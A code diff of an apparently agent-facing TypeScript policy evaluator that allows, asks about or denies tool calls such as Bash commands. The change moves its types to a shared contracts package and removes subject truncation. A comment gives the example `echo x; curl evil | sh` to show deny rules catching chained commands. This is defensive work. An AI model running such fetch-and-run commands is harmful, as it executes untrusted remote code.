@@ -11,10 +11,10 @@
  * environment it runs in — the profile's credentials, `ANTHROPIC_BASE_URL`, the
  * sandbox the fleet starts it in — never this file.
  *
- * The shape is the architect's §4 fold. It is **held locally** until
- * `SessionSpec.toolPolicy` lands in `foundation/contracts` (engineer-1's
- * follow-up PR), and then this file's types become re-exports — the evaluator,
- * its tests and the adapter's use of it do not change.
+ * The shape is the contracts': `SessionSpec.toolPolicy`, `ToolPolicy`,
+ * `ToolPolicyRule` and `defaultToolPolicy` live in `foundation/contracts` (§34).
+ * This file re-exports them and holds only what the contract leaves to the
+ * adapter — how a pattern is matched, and what is never matched at all.
  *
  * Evaluation is pure and ordered, so a policy can be read like the rule it is:
  * rules are tried in order and the first match wins; `tool` matches the tool
@@ -33,14 +33,22 @@
  * command it vouches for (`^echo .*$`). For `Bash` there is a second condition,
  * because `.*` is happy to walk across a pipe: a command carrying `;`, `&`,
  * `|`, a backtick, `$(`, a redirection (`<`, `>`) or a newline is never covered
- * by an allow rule, and falls through to the person who supervises it. A command
- * longer than 64 KB is not analysed at all and goes straight to that person.
+ * by an allow rule, and falls through to the person who supervises it.
  *
  * `ask` and `deny` rules are the other direction: they are searches, compiled as
  * written and tested anywhere in the subject, so a deny entry still catches
  * `curl` inside `echo x; curl evil | sh`. Nothing is lost by leaving them
  * unanchored, and a deny that only matched whole strings would be trivially
  * stepped around.
+ *
+ * ## Nothing is truncated, and nothing enormous is examined
+ *
+ * A pattern sees the whole subject — the whole command, the whole path, the
+ * whole input as JSON. Truncating would be a hole in the other direction: a
+ * deny pattern is a search, and a subject cut short is a subject a deny rule
+ * can be hidden past. Instead, a subject over 64 KB is not matched at all and
+ * goes to the person supervising the session, whatever the policy says: past
+ * that size nobody is reading it, and neither is the evaluator.
  *
  * `AskUserQuestion` is never evaluated: it is the peer asking its supervisor a
  * question, not a tool being permitted, and a policy that could deny it would
@@ -50,42 +58,25 @@
 
 import { resolve } from 'node:path'
 
+import { defaultToolPolicy, type ToolAction, type ToolPolicy, type ToolPolicyRule } from '@fleet/foundation-contracts'
 import { fleetError } from '@fleet/foundation-core'
 
-/** What to do with a tool call. */
-export type ToolAction = 'allow' | 'ask' | 'deny'
-
-export interface ToolPolicyRule {
-  /** A tool name (`Bash`, `Read`, …), or `*` for every tool. */
-  readonly tool: string
-  /** A RegExp source, tested against the tool's primary string. Absent = any call of `tool`. */
-  readonly pattern?: string
-  readonly action: ToolAction
-}
-
-export interface ToolPolicy {
-  readonly defaultAction: ToolAction
-  readonly rules: readonly ToolPolicyRule[]
-}
-
-/** What a session with no `toolPolicy` does: ask about everything, as before. */
-export const defaultToolPolicy: ToolPolicy = Object.freeze({
-  defaultAction: 'ask',
-  rules: Object.freeze([]),
-})
+/**
+ * The contract's policy types, under the names this package has always used.
+ * The evaluator below is the adapter's half; the shape is not.
+ */
+export { defaultToolPolicy }
+export type { ToolAction, ToolPolicy, ToolPolicyRule }
 
 /** The tool the model asks a human with. Never allowed or denied by a policy. */
 export const QUESTION_TOOL = 'AskUserQuestion'
 
-/** The longest `JSON.stringify(input)` a pattern is tested against (§4). */
-const MAX_SUMMARY_PATTERN_LENGTH = 500
-
 /**
- * The longest shell command that is examined at all. Past this the command is
- * not run through any pattern: it is handed to the person supervising the
- * session, whatever the policy says.
+ * The longest subject that is examined at all. Past this no pattern is tested:
+ * the call is handed to the person supervising the session, whatever the policy
+ * says.
  */
-export const MAX_COMMAND_LENGTH = 64 * 1024
+export const MAX_SUBJECT_LENGTH = 64 * 1024
 
 /**
  * What makes a command more than one command. An allow rule vouches for a
@@ -134,7 +125,7 @@ export const primaryString = (
     const path = input.file_path ?? input.path
     return typeof path === 'string' ? resolve(cwd, path) : ''
   }
-  return stringifyBounded(input)
+  return stringify(input)
 }
 
 /** A policy that fails to compile is a configuration error, surfaced before the session starts. */
@@ -178,9 +169,9 @@ export const evaluatePolicy = (
 ): ToolAction => {
   if (tool === QUESTION_TOOL) return 'ask'
   const subject = primaryString(tool, input, policy.cwd)
-  // Neither condition depends on the policy: an unexamined command and a
-  // command that could carry another one both go to the person supervising.
-  if (tool === 'Bash' && subject.length > MAX_COMMAND_LENGTH) return 'ask'
+  // Neither condition depends on the policy: an unexamined subject and one that
+  // could carry a second command both go to the person supervising the session.
+  if (subject.length > MAX_SUBJECT_LENGTH) return 'ask'
   const chains = tool === 'Bash' && SHELL_CHAINING.test(subject)
   for (const rule of policy.rules) {
     if (rule.tool !== '*' && rule.tool !== tool) continue
@@ -193,15 +184,19 @@ export const evaluatePolicy = (
   return policy.defaultAction
 }
 
-const stringifyBounded = (input: Readonly<Record<string, unknown>>): string => {
-  let json: string
+/**
+ * Every other tool is matched against its input as JSON, in full. Truncating
+ * would be a hole the other way: a deny rule is a search, and a cut-short
+ * subject is one a deny can be hidden past. Size is handled once, for every
+ * tool alike, in `evaluatePolicy`.
+ */
+const stringify = (input: Readonly<Record<string, unknown>>): string => {
   try {
-    json = JSON.stringify(input) ?? ''
+    return JSON.stringify(input) ?? ''
   } catch {
     // A circular or otherwise unserialisable input still has to be decided on;
     // an empty subject means a patterned rule does not match, which is the
     // conservative answer (`defaultAction`).
     return ''
   }
-  return json.length <= MAX_SUMMARY_PATTERN_LENGTH ? json : json.slice(0, MAX_SUMMARY_PATTERN_LENGTH)
 }
